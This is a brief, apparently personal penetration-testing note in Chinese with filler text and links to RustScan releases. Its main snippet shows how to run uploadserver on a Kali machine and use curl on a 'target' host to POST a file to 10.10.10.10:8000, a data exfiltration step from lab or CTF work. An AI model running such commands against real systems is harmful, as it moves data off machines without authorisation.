asdfasdfas
哈哈<BR>![图片alt](images/ttte.png)

利用 uploadserver 從目標上傳檔案到kali<BR>
```
# kali端:
pip install uploadserver
python3 -m uploadserver

# 目標端:
curl -X POST http://10.10.10.10:8000/upload -F "files=@myfile.zip"
```

[https://github.com/RustScan/RustScan/releases/](https://github.com/RustScan/RustScan/releases/)  
https://github.com/RustScan/RustScan/wiki/Installation-Guide

